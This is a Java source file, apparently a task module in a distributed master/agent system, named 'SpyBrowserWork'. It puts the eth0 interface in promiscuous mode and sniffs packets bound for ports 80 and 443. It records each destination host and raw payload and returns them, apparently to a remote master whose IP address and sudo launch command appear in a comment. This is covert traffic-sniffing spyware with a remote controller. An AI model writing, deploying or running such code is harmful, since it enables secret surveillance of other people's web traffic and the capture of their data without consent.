package com.kyrioslab.messages.works.impl;

import com.kyrioslab.messages.works.Work;
import com.sun.jna.Platform;
import org.pcap4j.core.*;
import org.pcap4j.packet.IpV4Packet;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.TcpPacket;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SpyBrowserWork implements Work {
    //sudo java -jar aps.jar akka.tcp://MasterSystem@178.151.60.148:2554/user/master_agent 178.151.60.148
    private Map<String, String> result = new HashMap<>();

    private boolean done = false;

    private static final int COUNT = 1000;
    private static final int READ_TIMEOUT = 10; // [ms]
    private static final int SNAPLEN = 65536; // [bytes]

    @Override
    public void doWork() {
        System.out.println("Starting to filter packets");
        String filter = "";
        List<PcapNetworkInterface> allDevs = null;
        try {
            allDevs = Pcaps.findAllDevs();
            System.out.println("Found devices: " + allDevs);
        } catch (PcapNativeException e) {
            e.printStackTrace();
        }
        PcapNetworkInterface nif = null;
        for (PcapNetworkInterface ic : allDevs) {
            if (ic.getName().equals("eth0")) { //Device picker can be used instead hardcore
                nif = ic;
                break;
            }
        }
        if (nif == null) {
            System.out.println("No device picked");
            done = true;
            return;
        }
        System.out.println(nif.getName() + "(" + nif.getDescription() + ")");
        PcapHandle handle;
        try {
            handle = nif.openLive(SNAPLEN,
                    PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);
            if (filter.length() != 0) {
                handle.setFilter(
                        filter,
                        BpfProgram.BpfCompileMode.OPTIMIZE
                );
            }
        } catch (PcapNativeException | NotOpenException e) {
            e.printStackTrace();
            return;
        }
        PListener listener = new PListener();
        try {
            handle.loop(COUNT, listener);
        } catch (InterruptedException | PcapNativeException | NotOpenException e) {
            e.printStackTrace();
        }

        PcapStat ps = null;
        try {
            ps = handle.getStats();
        } catch (PcapNativeException | NotOpenException e) {
            e.printStackTrace();
        }

        System.out.println("ps_recv: " + ps.getNumPacketsReceived());
        System.out.println("ps_drop: " + ps.getNumPacketsDropped());
        System.out.println("ps_ifdrop: " + ps.getNumPacketsDroppedByIf());
        if (Platform.isWindows()) {
            System.out.println("bs_capt: " + ps.getNumPacketsCaptured());
        }
        handle.close();
        result = listener.getResul();
        done = true;
    }

    public class PListener implements PacketListener {

        private Map<String, String> result = new HashMap<>();

        @Override
        public void gotPacket(Packet packet) {
            for (Packet p : packet) {
                if (p instanceof IpV4Packet) {
                    IpV4Packet ipp = (IpV4Packet) p;
                    for (Packet ippp : ipp) {
                        if (ippp instanceof TcpPacket && ipp.getHeader() instanceof IpV4Packet.IpV4Header) {
                            IpV4Packet.IpV4Header ip4h = ipp.getHeader();
                            TcpPacket.TcpHeader hdr = ((TcpPacket) ippp).getHeader();
                            int port = hdr.getDstPort().valueAsInt();
                            if (port == 80 || port == 443) {
                                String host, address;
                                host = ip4h.getDstAddr().getHostName();
                                address = ip4h.getDstAddr().getHostAddress();
                                String addr;
                                if (!host.equals(address)) {
                                    addr = host + "@" + address;
                                } else {
                                    addr = address;
                                }
                                addr += ":" + port;
                                result.put(addr, new String(
                                        (ippp.getPayload() == null ? new byte[0] : ippp.getPayload().getRawData())
                                ));
                                System.out.println(addr);
                            }
                        }
                    }
                }
            }
        }

        public Map<String, String> getResul() {
            return result;
        }

    }

    @Override
    public Map<String, String> getResult() {
        return result;
    }

    @Override
    public boolean isDone() {
        return done;
    }
}
